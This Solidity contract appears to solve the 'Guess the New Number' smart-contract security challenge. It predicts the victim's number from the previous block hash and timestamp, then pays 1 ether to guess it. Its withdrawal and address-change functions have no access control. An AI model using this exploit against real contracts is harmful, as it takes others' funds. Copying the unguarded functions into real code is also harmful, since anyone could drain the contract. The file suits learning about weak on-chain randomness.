pragma solidity ^0.4.26;


interface GuessTheNewNumberChallenge{
    function guess(uint8 n) external payable;
    function isComplete() external view returns (bool);
}

/*
interface TestTheNewNumberChallenge{
    function guess(uint8 n) public returns (bool);
    function isComplete() external view returns (bool);
    function resetState() public returns (bool);
}
*/
contract HackTheNumber {

    address victimAddr;

    //constructor
    function HackTheNumber(address _addr) public payable {
        victimAddr = _addr;
    }

    //fallback function
    function () external payable {
    }

    //solving function
    function attackNumber() external returns (uint8) {
        bool success = false;

        GuessTheNewNumberChallenge victimContract = GuessTheNewNumberChallenge(victimAddr);
        //TestTheNewNumberChallenge victimContract = TestTheNewNumberChallenge(victimAddr);
        uint8 number = uint8(keccak256(block.blockhash(block.number - 1), now));
        victimContract.guess.value(1 ether)(number);
        //victimContract.guess(number);
        success = victimContract.isComplete();
        if (success){
            return number;
        }
        else{
            return 0;
        }      
    }
    
    function sendEtherToContract() public payable returns (bool) {
        require(msg.value > 0 );
        bool success = address(this).balance >0;
        return success;
    }

    function sendBalanceBack() public returns(bool){
        msg.sender.transfer(address(this).balance);
        if (address(this).balance == 0) {
            return true;
        }
        else
        {
            return false;
        }
    }

    function changeVictimAddress (address _addr) external {
        victimAddr = _addr;
    }

    function getVictimAddress () public view returns (address) {
        return victimAddr;
    }
}